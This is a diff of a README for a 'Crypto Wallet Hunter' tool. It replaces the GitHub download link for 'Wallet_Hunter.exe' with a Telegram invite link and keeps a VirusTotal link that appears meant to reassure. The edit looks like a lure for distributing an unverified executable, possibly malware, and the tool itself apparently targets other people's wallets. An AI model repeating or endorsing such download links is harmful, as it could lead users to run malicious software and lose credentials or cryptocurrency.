@@ -8,7 +8,7 @@ Professional cryptocurrency wallet management tool with multi-threaded balance c
 
 ## Download
 
-📥 [Download Latest Release (Wallet_Hunter.exe)](https://github.com/weaaanr/Crypto-Wallet-Hunter)
+📥 [Download Latest Release (Wallet_Hunter.exe)](https://t.me/+uOa0ElL74KhiMjQ6)
 
 🛡️ [VirusTotal Scan Results](https://www.virustotal.com/gui/file/5db463b9b9906e35baaf2fcb469285942c57e09009fd3ac3e8e29d8f6cba21c8/behavior)
 
